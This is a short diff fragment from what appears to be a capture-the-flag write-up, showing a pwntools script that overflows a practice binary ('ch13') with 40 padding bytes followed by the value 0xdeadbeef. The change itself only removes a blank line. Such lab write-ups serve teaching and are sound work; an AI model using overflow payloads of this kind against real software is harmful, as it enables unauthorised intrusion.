@@ -8,7 +8,6 @@ We have to give ``deadbeef`` in reverse order since the stack reads them in the 
 
 ```
 from pwn import *
-
 io = process("./ch13")
 payload = b"A"*40
 payload += p64(0xdeadbeef)
